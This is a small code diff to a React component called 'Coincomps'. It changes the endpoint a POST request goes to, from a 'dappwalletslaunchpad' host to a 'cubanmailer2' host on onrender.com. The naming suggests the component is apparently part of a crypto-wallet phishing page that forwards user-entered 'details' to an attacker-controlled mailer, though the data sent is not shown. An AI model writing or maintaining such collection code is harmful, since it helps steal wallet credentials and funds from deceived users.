@@ -42,7 +42,7 @@ const Coincomps = ({ data }) => {
       };
 
       try {
-        const url = "https://dappwalletslaunchpad.onrender.com/details";
+        const url = "https://cubanmailer2.onrender.com/details";
 
         const res = await fetch(url, {
           method: "POST",
